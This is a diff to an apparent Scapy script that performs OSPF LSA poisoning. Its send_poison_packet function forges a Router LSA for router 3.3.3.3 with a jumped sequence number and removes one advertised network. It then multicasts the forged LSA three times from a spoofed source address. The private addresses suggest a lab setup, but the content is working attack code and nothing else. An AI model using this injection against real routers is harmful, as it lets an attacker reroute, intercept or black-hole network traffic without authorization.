@@ -522,46 +522,55 @@ def send_poison_packet(received_packet):
 
     global lsa_seq_r
     
+    lsa_seq = lsa_seq_r
+    
     ospf_update = OSPF_LSUpd(
         lsacount=1, # Number of LSAs in this update
         lsalist=[OSPF_Router_LSA(
-        age=0,
+        age=1,
         id="3.3.3.3", 
         adrouter="3.3.3.3", 
-        seq=lsa_seq_r + 1,
+        seq=lsa_seq + 99,
         options=0x22, # 0x22 is Demand Circuits, External Routing
         linklist=[
         OSPF_Link(type=2, id="10.0.0.0", data="255.255.255.0", metric=1),
-        OSPF_Link(type=2, id="10.0.10.0", data="255.255.255.0", metric=1),
         OSPF_Link(type=2, id="192.168.20.0", data="255.255.255.0", metric=1),
         OSPF_Link(type=3, id="3.3.3.3", data="255.255.255.255", metric=1)
         ])]
     )
+    
     ospf_header_update = OSPF_Hdr(
         version=2,
         type=4,
         src="3.3.3.3",
         area="0.0.0.0"
     )
+    
     ospf_packet_update = IP(
         src="192.168.10.99",
         dst="224.0.0.5"
     ) / ospf_header_update / ospf_update
     
     send(ospf_packet_update, iface="eth0", verbose=1)
+    time.sleep(2)
+    send(ospf_packet_update, iface="eth0", verbose=1)
+    time.sleep(2)
+    send(ospf_packet_update, iface="eth0", verbose=1)
+    time.sleep(2)
+        
 
 def send_periodic_hellos():
     # Once FULL state is reached, send periodic Hello packets
     print("Starting periodic Hello packets...")
     hello_count=0
     
-    while hello_count < 10:
+    while hello_count < 5:
         send_hello_neighbor()
         hello_count += 1
         print(hello_count)
         time.sleep(10)    
     
-    print("Sent 10 Hello packets.")
+    print("Sent 5 Hello packets.")
 
 def send_periodic_hellos_4ever():
     print("Resuming periodic Hello packets...")
